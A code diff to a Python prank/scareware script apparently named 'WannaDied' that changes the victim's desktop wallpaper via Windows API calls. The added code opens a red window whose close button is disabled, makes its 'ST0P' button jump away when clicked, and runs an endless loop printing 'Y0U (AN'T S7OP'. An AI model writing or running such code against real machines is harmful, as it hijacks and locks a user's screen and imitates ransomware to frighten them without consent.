@@ -2,11 +2,12 @@
 from urllib.request import urlretrieve
 from tqdm import trange
 from tkinter import messagebox
+from tkinter import *
 import time
 import ctypes
 import os
 import shutil
-import getpass
+import random
 
 # alert function
 def alert():
@@ -33,10 +34,39 @@ def set_background():
     image = ctypes.c_wchar_p(wallpaper_path)
     ctypes.windll.user32.SystemParametersInfoW(20,0,image,0)
 
-# move desktop
+# do infinite window
+def infinite_windows():
+    class StopButton():
+
+        def __init__(self, win):
+            self.win = win
+            self.stop_button = Button(self.win, text="ST0P", font=("Arial", 100), command=self.move_button)
+            self.stop_button.pack(expand=YES)
+
+        def move_button(self):
+            x, y = self.stop_button.winfo_x(), self.stop_button.winfo_y()
+            self.stop_button.place(x=x + random.randrange(-150, 150), y=y + random.randrange(-150, 150))
+            while True:
+                self.text = ("Y0U (AN'T S7OP")
+                self.text.replace("0","o")
+                self.text.replace("o", "0")
+                self.text.replace("(", "c")
+                self.text.replace("c", "(")
+                print("\033[1;31m")
+                print(self.text)
+    win = Tk()
+    win.title("WannaDied")
+    win.geometry("1080x720")
+    win.config(bg="red")
+    win.resizable(False, False)
+    win.protocol("WM_DELETE_WINDOW", lambda: None)
+    stop_button = StopButton(win)
+    win.mainloop()
 
 # call all functions
 alert()
 show_in_console()
 download_wallpaper()
 set_background()
+infinite_windows()
+
